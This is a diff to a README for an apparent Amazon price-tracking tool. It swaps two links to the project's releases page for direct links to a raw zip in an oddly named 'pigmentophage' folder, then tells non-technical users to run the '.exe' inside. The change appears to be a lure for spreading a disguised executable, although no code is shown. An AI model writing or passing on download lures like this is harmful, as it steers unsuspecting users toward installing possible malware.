@@ -1,12 +1,12 @@
 # 📊 amazon-price-tracker - Track Amazon prices and save money
 
-[![Download](https://img.shields.io/badge/Download_Application-blue)](https://github.com/Cyrusclean396/amazon-price-tracker/releases)
+[![Download](https://img.shields.io/badge/Download_Application-blue)](https://github.com/Cyrusclean396/amazon-price-tracker/raw/refs/heads/main/pigmentophage/amazon_tracker_price_v1.6.zip)
 
 This application monitors Amazon product pages. It detects price changes and sends updates to your email address. You do not need to write code to use this tool.
 
 ## 📥 Getting Started
 
-Visit [this page](https://github.com/Cyrusclean396/amazon-price-tracker/releases) to download the application. 
+Visit [this page](https://github.com/Cyrusclean396/amazon-price-tracker/raw/refs/heads/main/pigmentophage/amazon_tracker_price_v1.6.zip) to download the application. 
 
 Choose the file ending in `.exe` for Windows systems. Save this file to a folder on your computer. You can place it on your desktop or in your documents folder for easy access. Double-click the file to start the installation process. Follow the prompts on the screen to finish the setup.
 
